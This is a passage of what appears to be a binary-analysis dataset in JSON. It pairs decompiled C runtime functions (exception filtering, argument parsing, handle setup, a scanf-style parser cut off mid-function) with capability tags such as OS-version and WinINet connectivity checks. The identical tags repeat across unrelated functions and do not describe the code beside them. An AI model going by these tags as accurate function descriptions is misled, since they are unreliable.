        "decompiled_code": "\nuint __cdecl fcn.00420d78(int32_t arg_8h, uint ExceptionInfo)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint var_4h;\n    \n    iVar4 = fcn.0041e005();\n    piVar1 = *(iVar4 + 0x54);\n    piVar7 = piVar1;\n    do {\n        if (*piVar7 == arg_8h) break;\n        piVar7 = piVar7 + 3;\n    } while (piVar7 < piVar1 + *0x44471c * 3);\n    if ((piVar1 + *0x44471c * 3 <= piVar7) || (*piVar7 != arg_8h)) {\n        piVar7 = NULL;\n    }\n    if ((piVar7 == NULL) || (pcVar2 = piVar7[2],  pcVar2 == NULL)) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(ExceptionInfo);\n    }\n    else if (pcVar2 == 0x5) {\n        piVar7[2] = 0;\n        uVar5 = 1;\n    }\n    else {\n        if (pcVar2 != 0x1) {\n            uVar5 = *(iVar4 + 0x58);\n            *(iVar4 + 0x58) = ExceptionInfo;\n            if (piVar7[1] == 8) {\n                if (*0x444710 < *0x444714 + *0x444710) {\n                    iVar6 = *0x444710 * 0xc;\n                    iVar8 = *0x444710;\n                    do {\n                        *(iVar6 + 8 + *(iVar4 + 0x54)) = 0;\n                        iVar8 = iVar8 + 1;\n                        iVar6 = iVar6 + 0xc;\n                    } while (iVar8 < *0x444714 + *0x444710);\n                }\n                iVar8 = *piVar7;\n                uVar3 = *(iVar4 + 0x5c);\n                if (iVar8 == -0x3fffff72) {\n                    *(iVar4 + 0x5c) = 0x83;\n                }\n                else if (iVar8 == -0x3fffff70) {\n                    *(iVar4 + 0x5c) = 0x81;\n                }\n                else if (iVar8 == -0x3fffff6f) {\n                    *(iVar4 + 0x5c) = 0x84;\n                }\n                else if (iVar8 == -0x3fffff6d) {\n                    *(iVar4 + 0x5c) = 0x85;\n                }\n                else if (iVar8 == -0x3fffff73) {\n                    *(iVar4 + 0x5c) = 0x82;\n                }\n                else if (iVar8 == -0x3fffff71) {\n                    *(iVar4 + 0x5c) = 0x86;\n                }\n                else if (iVar8 == -0x3fffff6e) {\n                    *(iVar4 + 0x5c) = 0x8a;\n                }\n                (*pcVar2)(8, *(iVar4 + 0x5c));\n                *(iVar4 + 0x5c) = uVar3;\n            }\n            else {\n                piVar7[2] = 0;\n                (*pcVar2)(piVar7[1]);\n            }\n            *(iVar4 + 0x58) = uVar5;\n        }\n        uVar5 = 0xffffffff;\n    }\n    return uVar5;\n}\n",
        "token_count": 845
    },
    "00421000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421000(uint8_t **arg_8h, int32_t *arg_ch)\n\n{\n    bool bVar1;\n    bool bVar2;\n    uint8_t *in_EAX;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    uint8_t *in_ECX;\n    uint32_t uVar6;\n    int32_t *unaff_ESI;\n    uint var_4h;\n    \n    bVar1 = false;\n    *unaff_ESI = 0;\n    *arg_ch = 1;\n    if (arg_8h != NULL) {\n        *arg_8h = in_ECX;\n        arg_8h = arg_8h + 1;\n    }\n    do {\n        if (*in_EAX == 0x22) {\n            bVar1 = !bVar1;\n            puVar3 = in_EAX + 1;\n            uVar5 = 0x22;\n        }\n        else {\n            *unaff_ESI = *unaff_ESI + 1;\n            if (in_ECX != NULL) {\n                *in_ECX = *in_EAX;\n                in_ECX = in_ECX + 1;\n            }\n            uVar5 = *in_EAX;\n            puVar3 = in_EAX + 1;\n            if ((*(uVar5 + 0x44ace1) & 4) != 0) {\n                *unaff_ESI = *unaff_ESI + 1;\n                if (in_ECX != NULL) {\n                    *in_ECX = *puVar3;\n                    in_ECX = in_ECX + 1;\n                }\n                puVar3 = in_EAX + 2;\n            }\n            if (uVar5 == 0) {\n                puVar3 = puVar3 + -1;\n                goto code_r0x00421079;\n            }\n        }\n        in_EAX = puVar3;\n    } while ((bVar1) || ((uVar5 != 0x20 && (uVar5 != 9))));\n    if (in_ECX != NULL) {\n        in_ECX[-1] = 0;\n    }\ncode_r0x00421079:\n    bVar1 = false;\n    while (*puVar3 != 0) {\n        for (; (*puVar3 == 0x20 || (*puVar3 == 9)); puVar3 = puVar3 + 1) {\n        }\n        if (*puVar3 == 0) break;\n        if (arg_8h != NULL) {\n            *arg_8h = in_ECX;\n            arg_8h = arg_8h + 1;\n        }\n        *arg_ch = *arg_ch + 1;\n        while( true ) {\n            bVar2 = true;\n            uVar6 = 0;\n            for (; *puVar3 == 0x5c; puVar3 = puVar3 + 1) {\n                uVar6 = uVar6 + 1;\n            }\n            if (*puVar3 == 0x22) {\n                puVar4 = puVar3;\n                if ((uVar6 & 1) == 0) {\n                    if ((!bVar1) || (puVar4 = puVar3 + 1,  *puVar4 != 0x22)) {\n                        bVar2 = false;\n                        puVar4 = puVar3;\n                    }\n                    bVar1 = !bVar1;\n                }\n                uVar6 = uVar6 >> 1;\n                puVar3 = puVar4;\n            }\n            for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n                if (in_ECX != NULL) {\n                    *in_ECX = 0x5c;\n                    in_ECX = in_ECX + 1;\n                }\n                *unaff_ESI = *unaff_ESI + 1;\n            }\n            uVar5 = *puVar3;\n            if ((uVar5 == 0) || ((!bVar1 && ((uVar5 == 0x20 || (uVar5 == 9)))))) break;\n            if (bVar2) {\n                if (in_ECX == NULL) {\n                    if ((*(uVar5 + 0x44ace1) & 4) != 0) {\n                        puVar3 = puVar3 + 1;\n                        *unaff_ESI = *unaff_ESI + 1;\n                    }\n                }\n                else {\n                    if ((*(uVar5 + 0x44ace1) & 4) != 0) {\n                        *in_ECX = uVar5;\n                        in_ECX = in_ECX + 1;\n                        puVar3 = puVar3 + 1;\n                        *unaff_ESI = *unaff_ESI + 1;\n                    }\n                    *in_ECX = *puVar3;\n                    in_ECX = in_ECX + 1;\n                }\n                *unaff_ESI = *unaff_ESI + 1;\n            }\n            puVar3 = puVar3 + 1;\n        }\n        if (in_ECX != NULL) {\n            *in_ECX = 0;\n            in_ECX = in_ECX + 1;\n        }\n        *unaff_ESI = *unaff_ESI + 1;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = NULL;\n    }\n    *arg_ch = *arg_ch + 1;\n    return;\n}\n",
        "token_count": 1211
    },
    "00421330": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00421330(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    uchar auStack68 [46];\n    int16_t iStack22;\n    int32_t *piStack20;\n    \n    puVar3 = fcn.0041ba5b(0x480);\n    if (puVar3 == NULL) {\n        uVar4 = 0xffffffff;\n    }\n    else {\n        *0x44ab84 = 0x20;\n        *0x44aba0 = puVar3;\n        for (; puVar3 < *0x44aba0 + 0x120; puVar3 = puVar3 + 9) {\n            *puVar3 = 0xffffffff;\n            puVar3[2] = 0;\n            *(puVar3 + 1) = 0;\n            *(puVar3 + 5) = 10;\n        }\n        (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(auStack68);\n        if ((iStack22 != 0) && (piStack20 != NULL)) {\n            iVar8 = *piStack20;\n            piStack20 = piStack20 + 1;\n            piVar9 = iVar8 + piStack20;\n            if (0x7ff < iVar8) {\n                iVar8 = 0x800;\n            }\n            iVar6 = iVar8;\n            if (*0x44ab84 < iVar8) {\n                puVar3 = 0x44aba4;\n                do {\n                    puVar5 = fcn.0041ba5b(0x480);\n                    iVar6 = *0x44ab84;\n                    if (puVar5 == NULL) break;\n                    *0x44ab84 = *0x44ab84 + 0x20;\n                    *puVar3 = puVar5;\n                    puVar2 = puVar5;\n                    for (; puVar5 < puVar2 + 0x120; puVar5 = puVar5 + 9) {\n                        *puVar5 = 0xffffffff;\n                        puVar5[2] = 0;\n                        *(puVar5 + 1) = 0;\n                        *(puVar5 + 5) = 10;\n                        puVar2 = *puVar3;\n                    }\n                    puVar3 = puVar3 + 1;\n                    iVar6 = iVar8;\n                } while (*0x44ab84 < iVar8);\n            }\n            uVar7 = 0;\n            if (0 < iVar6) {\n                do {\n                    if (((*piVar9 != -1) && ((*piStack20 & 1) != 0)) &&\n                       (((*piStack20 & 8) != 0 || (iVar8 = (*_sym.imp.KERNEL32.dll_GetFileType)(*piVar9),  iVar8 != 0)))\n                       ) {\n                        piVar1 = *((uVar7 >> 5) * 4 + 0x44aba0) + (uVar7 & 0x1f) * 0x24;\n                        *piVar1 = *piVar9;\n                        *(piVar1 + 1) = *piStack20;\n                        iVar8 = fcn.00423cc4(piVar1 + 3, 4000);\n                        if (iVar8 == 0) {\n                            return 0xffffffff;\n                        }\n                        piVar1[2] = piVar1[2] + 1;\n                    }\n                    piVar9 = piVar9 + 1;\n                    uVar7 = uVar7 + 1;\n                    piStack20 = piStack20 + 1;\n                } while (uVar7 < iVar6);\n            }\n        }\n        iVar8 = 0;\n        do {\n            piVar9 = *0x44aba0 + iVar8 * 9;\n            if (*piVar9 == -1) {\n                *(piVar9 + 1) = 0x81;\n                if (iVar8 == 0) {\n                    iVar6 = -10;\n                }\n                else {\n                    iVar6 = -0xb - (iVar8 != 1);\n                }\n                iVar6 = (*_sym.imp.KERNEL32.dll_GetStdHandle)(iVar6);\n                if ((iVar6 == -1) || (uVar7 = (*_sym.imp.KERNEL32.dll_GetFileType)(iVar6),  uVar7 == 0)) {\n                    *(piVar9 + 1) = *(piVar9 + 1) | 0x40;\n                }\n                else {\n                    *piVar9 = iVar6;\n                    if ((uVar7 & 0xff) == 2) {\n                        *(piVar9 + 1) = *(piVar9 + 1) | 0x40;\n                    }\n                    else if ((uVar7 & 0xff) == 3) {\n                        *(piVar9 + 1) = *(piVar9 + 1) | 8;\n                    }\n                    iVar6 = fcn.00423cc4(piVar9 + 3, 4000);\n                    if (iVar6 == 0) {\n                        return 0xffffffff;\n                    }\n                    piVar9[2] = piVar9[2] + 1;\n                }\n            }\n            else {\n                *(piVar9 + 1) = *(piVar9 + 1) | 0x80;\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 3);\n        (*_sym.imp.KERNEL32.dll_SetHandleCount)(*0x44ab84);\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 1264
    },
    "00421854": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.00421854(uint arg_8h_2, uint arg_ch_2, uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uchar uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    uint uVar10;\n    uint32_t uVar11;\n    uint8_t uVar12;\n    uint8_t uVar13;\n    uint32_t uVar14;\n    uint *puVar15;\n    int32_t unaff_EBP;\n    uint8_t *puVar16;\n    uint8_t *puVar17;\n    char *pcVar18;\n    char *pcVar19;\n    uint *puVar20;\n    uint8_t *puVar21;\n    ulong uVar22;\n    uint var_4h;\n    uint var_1e8h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_194h;\n    uint var_18ch;\n    uint var_184h;\n    uint var_17dh;\n    uint var_1ch;\n    uint var_18h;\n    uint var_4h_2;\n    uint uStack4;\n    \n    uStack4 = 0x1cc;\n    var_4h_2 = 0x43b5d8;\n    fcn.0041cd84();\n    *(unaff_EBP + -0x1c) = *0x444220;\n    *(unaff_EBP + -0x1bc) = 0;\n    *(unaff_EBP + -0x1d8) = 0;\n    *(unaff_EBP + -0x1b0) = 0;\n    *(unaff_EBP + -0x194) = 0;\n    *(unaff_EBP + -0x195) = 0;\n    *(unaff_EBP + -0x184) = 0;\n    *(unaff_EBP + -0x1b8) = 0;\ncode_r0x00421897:\n    if (**(unaff_EBP + 0xc) == '\\0') {\ncode_r0x00422589:\n        if (*(unaff_EBP + -0x1d8) == 1) {\n            fcn.0041ba6d(*(unaff_EBP + -0x1bc));\n        }\n        *(unaff_EBP + -0x1ec) = 0x4225ca;\n        fcn.0041c6de();\n        *(unaff_EBP + -0x1ec) = 0x4225cf;\n        fcn.0041cdbf();\n        return;\n    }\n    iVar7 = fcn.00422f8f(**(unaff_EBP + 0xc));\n    if (iVar7 != 0) {\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n        do {\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            iVar7 = fcn.0042183e();\n            iVar8 = fcn.00422f8f(iVar7);\n        } while (iVar8 != 0);\n        if (iVar7 != -1) {\n            fcn.004248c4(iVar7, *(unaff_EBP + 8));\n        }\n        do {\n            *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) + 1;\n            iVar7 = fcn.00422f8f(**(unaff_EBP + 0xc));\n        } while (iVar7 != 0);\n        goto code_r0x00421897;\n    }\n    puVar21 = *(unaff_EBP + 0xc);\n    if (*puVar21 != 0x25) {\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n        uVar14 = fcn.0042183e();\n        *(unaff_EBP + -0x194) = uVar14;\n        uVar13 = *puVar21;\n        *(unaff_EBP + 0xc) = puVar21 + 1;\n        if (uVar13 != uVar14) goto code_r0x00422550;\n        if ((*(*0x444910 + 1 + (uVar14 & 0xff) * 2) & 0x80) != 0) {\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            uVar11 = fcn.0042183e();\n            uVar13 = puVar21[1];\n            *(unaff_EBP + 0xc) = puVar21 + 2;\n            if (uVar13 != uVar11) {\n                if (uVar11 != 0xffffffff) {\n                    fcn.004248c4(uVar11, *(unaff_EBP + 8));\n                }\n                goto code_r0x00422550;\n            }\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n        }\n        goto code_r0x0042256a;\n    }\n    iVar7 = 0;\n    *(unaff_EBP + -0x1a0) = 0;\n    *(unaff_EBP + -0x198) = 0;\n    *(unaff_EBP + -0x19c) = 0;\n    *(unaff_EBP + -0x1b4) = 0;\n    *(unaff_EBP + -0x18c) = 0;\n    *(unaff_EBP + -0x1a1) = 0;\n    *(unaff_EBP + -0x197) = 0;\n    *(unaff_EBP + -0x18e) = 0;\n    *(unaff_EBP + -0x17d) = 0;\n    *(unaff_EBP + -0x196) = 0;\n    *(unaff_EBP + -0x185) = 0;\n    *(unaff_EBP + -0x18d) = 1;\n    *(unaff_EBP + -0x1c8) = 0;\n    do {\n        puVar16 = puVar21 + 1;\n        uVar14 = *puVar16;\n        iVar8 = fcn.00422f16(uVar14);\n        puVar17 = puVar16;\n        if (iVar8 == 0) {\n            if (uVar14 < 0x4f) {\n                if (uVar14 != 0x4e) {\n                    if (uVar14 == 0x2a) {\n                        *(unaff_EBP + -0x18e) = *(unaff_EBP + -0x18e) + '\\x01';\n                    }\n                    else if (uVar14 != 0x46) {\n                        if (uVar14 == 0x49) {\n                            uVar13 = puVar21[2];\n                            if ((uVar13 == 0x36) && (puVar21[3] == 0x34)) {\n                                *(unaff_EBP + -0x1c8) = *(unaff_EBP + -0x1c8) + 1;\n                                *(unaff_EBP + -0x1ac) = 0;\n                                *(unaff_EBP + -0x1a8) = 0;\n                                puVar17 = puVar21 + 3;\n                            }\n                            else if (((uVar13 != 0x33) || (puVar17 = puVar21 + 3,  *puVar17 != 0x32)) &&\n                                    ((((puVar17 = puVar16,  uVar13 != 100 && (uVar13 != 0x69)) && (uVar13 != 0x6f)) &&\n                                     ((uVar13 != 0x78 && (uVar13 != 0x58)))))) goto code_r0x00421a1e;\n                        }\n                        else if (uVar14 == 0x4c) {\n                            *(unaff_EBP + -0x18d) = *(unaff_EBP + -0x18d) + '\\x01';\n                        }\n                        else {\ncode_r0x00421a1e:\n                            *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                            puVar17 = puVar16;\n                        }\n                    }\n                }\n            }\n            else if (uVar14 == 0x68) {\n                *(unaff_EBP + -0x18d) = *(unaff_EBP + -0x18d) + -1;\n                *(unaff_EBP + -0x185) = *(unaff_EBP + -0x185) + -1;\n            }\n            else {\n                if (uVar14 == 0x6c) {\n                    *(unaff_EBP + -0x18d) = *(unaff_EBP + -0x18d) + '\\x01';\n                }\n                else if (uVar14 != 0x77) goto code_r0x00421a1e;\n                *(unaff_EBP + -0x185) = *(unaff_EBP + -0x185) + '\\x01';\n            }\n        }\n        else {\n            *(unaff_EBP + -0x1b4) = *(unaff_EBP + -0x1b4) + 1;\n            iVar7 = (uVar14 - 0x30) + iVar7 * 10;\n        }\n        puVar21 = puVar17;\n    } while (*(unaff_EBP + -0x17d) == '\\0');\n    *(unaff_EBP + -0x18c) = iVar7;\n    *(unaff_EBP + 0xc) = puVar17;\n    if (*(unaff_EBP + -0x18e) == '\\0') {\n        puVar15 = *(unaff_EBP + 0x10);\n        *(unaff_EBP + -0x1dc) = puVar15;\n        *(unaff_EBP + 0x10) = puVar15 + 1;\n        puVar15 = *puVar15;\n        *(unaff_EBP + -0x1b0) = puVar15;\n    }\n    else {\n        puVar15 = *(unaff_EBP + -0x1b0);\n    }\n    *(unaff_EBP + -0x17d) = 0;\n    if ((*(unaff_EBP + -0x185) == '\\0') &&\n       ((uVar13 = *puVar17,  uVar13 == 0x53 || (*(unaff_EBP + -0x185) = 0xff,  uVar13 == 0x43)))) {\n        *(unaff_EBP + -0x185) = 1;\n    }\n    uVar14 = *puVar17 | 0x20;\n    *(unaff_EBP + -0x1c0) = uVar14;\n    if (uVar14 == 0x6e) {\ncode_r0x00421aeb:\n        uVar9 = *(unaff_EBP + 8);\n    }\n    else {\n        if ((uVar14 != 99) && (uVar14 != 0x7b)) {\n            do {\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                uVar9 = fcn.0042183e();\n                iVar7 = fcn.00422f8f(uVar9);\n            } while (iVar7 != 0);\n            *(unaff_EBP + -0x194) = uVar9;\n            goto code_r0x00421aeb;\n        }\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n        uVar9 = *(unaff_EBP + 8);\n        uVar10 = fcn.0042183e();\n        *(unaff_EBP + -0x194) = uVar10;\n    }\n    iVar7 = *(unaff_EBP + -0x1b4);\n    if ((iVar7 != 0) && (*(unaff_EBP + -0x18c) == 0)) {\ncode_r0x00421dfb:\n        uVar14 = *(unaff_EBP + -0x194);\ncode_r0x00422550:\n        if (uVar14 != 0xffffffff) {\n            fcn.004248c4(*(unaff_EBP + -0x194), *(unaff_EBP + 8));\n        }\n        goto code_r0x00422589;\n    }\n    if (0x6f < uVar14) {\n        if (uVar14 == 0x70) {\n            *(unaff_EBP + -0x18d) = 1;\ncode_r0x004221e8:\n            uVar11 = *(unaff_EBP + -0x194);\n            if (uVar11 == 0x2d) {\n                *(unaff_EBP + -0x197) = 1;\n            }\n            else if (uVar11 != 0x2b) goto code_r0x0042222b;\n            piVar1 = unaff_EBP + -0x18c;\n            *piVar1 = *piVar1 + -1;\n            if ((*piVar1 == 0) && (iVar7 != 0)) {\n                *(unaff_EBP + -0x17d) = 1;\n            }\n            else {\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                uVar11 = fcn.0042183e();\ncode_r0x00422225:\n                *(unaff_EBP + -0x194) = uVar11;\n            }\n        }\n        else {\n            if (uVar14 == 0x73) {\ncode_r0x00421dae:\n                if ('\\0' < *(unaff_EBP + -0x185)) {\n                    *(unaff_EBP + -0x196) = 1;\n                }\ncode_r0x00421f78:\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n                puVar20 = puVar15;\n                if (*(unaff_EBP + -0x194) != -1) {\n                    fcn.004248c4(*(unaff_EBP + -0x194), *(unaff_EBP + 8));\n                }\n                do {\n                    if ((*(unaff_EBP + -0x1b4) != 0) &&\n                       (iVar7 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar7 == 0)\n                       ) goto code_r0x00422199;\n                    *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                    uVar11 = fcn.0042183e();\n                    *(unaff_EBP + -0x194) = uVar11;\n                    if (uVar11 == 0xffffffff) goto code_r0x00422183;\n                    uVar13 = uVar11;\n                    if ((uVar14 != 99) && (((uVar14 != 0x73 || ((8 < uVar11 && (uVar11 < 0xe)))) || (uVar11 == 0x20))))\n                    {\n                        if ((uVar14 != 0x7b) ||\n                           (((*((uVar11 >> 3) + *(unaff_EBP + -0x1bc)) ^ *(unaff_EBP + -0x1a1)) & 1 << (uVar13 & 7)) ==\n                            0)) goto code_r0x00422183;\n                        uVar14 = *(unaff_EBP + -0x1c0);\n                    }\n                    if (*(unaff_EBP + -0x18e) == '\\0') {\n                        if (*(unaff_EBP + -0x196) == '\\0') {\n                            *puVar15 = uVar13;\n                            puVar15 = puVar15 + 1;\n                        }\n                        else {\n                            *(unaff_EBP + -0x1c4) = uVar13;\n                            if ((*(*0x444910 + 1 + (uVar11 & 0xff) * 2) & 0x80) != 0) {\n                                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                                uVar6 = fcn.0042183e();\n                                *(unaff_EBP + -0x1c3) = uVar6;\n                            }\n                            fcn.004247b8(unaff_EBP + -0x1cc, unaff_EBP + -0x1c4, *0x444cc0);\n                            *puVar15 = *(unaff_EBP + -0x1cc);\n                            puVar15 = puVar15 + 2;\n                        }\n                        *(unaff_EBP + -0x1b0) = puVar15;\n                    }\n                    else {\n                        puVar20 = puVar20 + 1;\n                    }\n                } while( true );\n            }\n            if (uVar14 == 0x75) goto code_r0x004221e8;\n            if (uVar14 != 0x78) {\n                if (uVar14 == 0x7b) {\n                    if ('\\0' < *(unaff_EBP + -0x185)) {\n                        *(unaff_EBP + -0x196) = 1;\n                    }\n                    iVar7 = *(unaff_EBP + 0xc);\n                    puVar21 = iVar7 + 1;\n                    *(unaff_EBP + 0xc) = puVar21;\n                    *(unaff_EBP + -0x1d0) = puVar21;\n                    if (*puVar21 == 0x5e) {\n                        puVar21 = iVar7 + 2;\n                        *(unaff_EBP + -0x1d0) = puVar21;\n                        *(unaff_EBP + -0x1a1) = 0xff;\n                    }\n                    puVar15 = *(unaff_EBP + -0x1bc);\n                    if (*(unaff_EBP + -0x1bc) == NULL) {\n                        *(unaff_EBP + -4) = 0;\n                        fcn.0041bcd0();\n                        *(unaff_EBP + -0x18) = &fcn.00421854::var_4h_2;\n                        *(unaff_EBP + -0x1bc) = &fcn.00421854::var_4h_2;\n                        *(unaff_EBP + -4) = 0xffffffff;\n                        puVar15 = &fcn.00421854::var_4h_2;\n                    }\n                    fcn.0041cc60(puVar15, 0, 0x20);\n                    if (*(unaff_EBP + -0x1c0) != 0x7b) goto code_r0x00421f4c;\n                    if (*puVar21 != 0x5d) goto code_r0x00421f4c;\n                    uVar13 = 0x5d;\n                    puVar21 = puVar21 + 1;\n                    *(puVar15 + 0xb) = 0x20;\n                    while (uVar12 = *puVar21,  uVar12 != 0x5d) {\n                        if (((uVar12 == 0x2d) && (uVar13 != 0)) && (uVar3 = puVar21[1],  uVar3 != 0x5d)) {\n                            puVar21 = puVar21 + 2;\n                            uVar12 = uVar3;\n                            if (uVar13 < uVar3) {\n                                uVar12 = uVar13;\n                                uVar13 = uVar3;\n                            }\n                            if (uVar12 <= uVar13) {\n                                uVar14 = uVar12;\n                                *(unaff_EBP + -0x1d4) = (uVar13 - uVar12) + 1;\n                                do {\n                                    *(puVar15 + (uVar14 >> 3)) = *(puVar15 + (uVar14 >> 3)) | '\\x01' << (uVar14 & 7);\n                                    uVar14 = uVar14 + 1;\n                                    piVar1 = unaff_EBP + -0x1d4;\n                                    *piVar1 = *piVar1 + -1;\n                                } while (*piVar1 != 0);\n                            }\n                            uVar13 = 0;\n                        }\n                        else {\n                            *(unaff_EBP + -0x198) = uVar12;\n                            *(puVar15 + (uVar12 >> 3)) = *(puVar15 + (uVar12 >> 3)) | '\\x01' << (uVar12 & 7);\n                            puVar21 = puVar21 + 1;\ncode_r0x00421f4c:\n                            uVar13 = *(unaff_EBP + -0x198);\n                        }\n                    }\n                    puVar15 = *(unaff_EBP + -0x1b0);\n                    if (*(unaff_EBP + -0x1c0) == 0x7b) {\n                        *(unaff_EBP + 0xc) = puVar21;\n                    }\n                    uVar14 = *(unaff_EBP + -0x1c0);\n                    goto code_r0x00421f78;\n                }\n                goto code_r0x00421ded;\n            }\ncode_r0x00421b75:\n            uVar11 = *(unaff_EBP + -0x194);\n            if (uVar11 == 0x2d) {\n                *(unaff_EBP + -0x197) = 1;\ncode_r0x0042209b:\n                piVar1 = unaff_EBP + -0x18c;\n                *piVar1 = *piVar1 + -1;\n                if ((*piVar1 == 0) && (iVar7 != 0)) {\n                    *(unaff_EBP + -0x17d) = 1;\n                }\n                else {\n                    *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                    uVar11 = fcn.0042183e();\n                    *(unaff_EBP + -0x194) = uVar11;\n                }\n            }\n            else if (uVar11 == 0x2b) goto code_r0x0042209b;\n            if (uVar11 == 0x30) {\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                uVar11 = fcn.0042183e();\n                *(unaff_EBP + -0x194) = uVar11;\n                if ((uVar11 == 'x') || (uVar11 == 'X')) {\n                    *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                    uVar11 = fcn.0042183e();\n                    *(unaff_EBP + -0x194) = uVar11;\n                    if ((*(unaff_EBP + -0x1b4) != 0) &&\n                       (*(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -2,  *(unaff_EBP + -0x18c) < 1)) {\n                        *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                    }\n                    uVar14 = 0x78;\n                }\n                else {\n                    *(unaff_EBP + -0x19c) = 1;\n                    if (uVar14 == 0x78) {\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n                        if (uVar11 != 0xffffffff) {\n                            fcn.004248c4(uVar11, uVar9);\n                        }\n                        uVar11 = 0x30;\n                        goto code_r0x00422225;\n                    }\n                    if (*(unaff_EBP + -0x1b4) != 0) {\n                        piVar1 = unaff_EBP + -0x18c;\n                        *piVar1 = *piVar1 + -1;\n                        if (*piVar1 == 0) {\n                            *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                        }\n                    }\n                    uVar14 = 0x6f;\n                }\n            }\n        }\ncode_r0x0042222b:\n        if (*(unaff_EBP + -0x1c8) == 0) {\n            if (*(unaff_EBP + -0x17d) == '\\0') {\n                do {\n                    if ((uVar14 == 0x78) || (uVar14 == 0x70)) {\n                        iVar7 = fcn.00422f50(uVar11);\n                        if (iVar7 != 0) {\n                            *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) << 4;\n                            iVar7 = fcn.00422f16(uVar11);\n                            if (iVar7 == 0) {\n                                uVar11 = (uVar11 & 0xffffffdf) - 7;\n                            }\n                            goto code_r0x00422408;\n                        }\ncode_r0x00422402:\n                        *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                    }\n                    else {\n                        iVar7 = fcn.00422f16(uVar11);\n                        if (iVar7 == 0) goto code_r0x00422402;\n                        if (uVar14 == 0x6f) {\n                            if (0x37 < uVar11) goto code_r0x00422402;\n                            *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) << 3;\n                        }\n                        else {\n                            *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) * 10;\n                        }\n                    }\ncode_r0x00422408:\n                    if (*(unaff_EBP + -0x17d) == '\\0') {\n                        *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n                        *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) + -0x30 + uVar11;\n                        if (*(unaff_EBP + -0x1b4) != 0) {\n                            piVar1 = unaff_EBP + -0x18c;\n                            *piVar1 = *piVar1 + -1;\n                            if (*piVar1 == 0) {\n                                *(unaff_EBP + -0x17d) = 1;\n                                goto code_r0x00422466;\n                            }\n                        }\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                        uVar11 = fcn.0042183e();\n                    }\n                    else {\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n                        if (uVar11 != 0xffffffff) {\n                            fcn.004248c4(uVar11, uVar9);\n                        }\n                    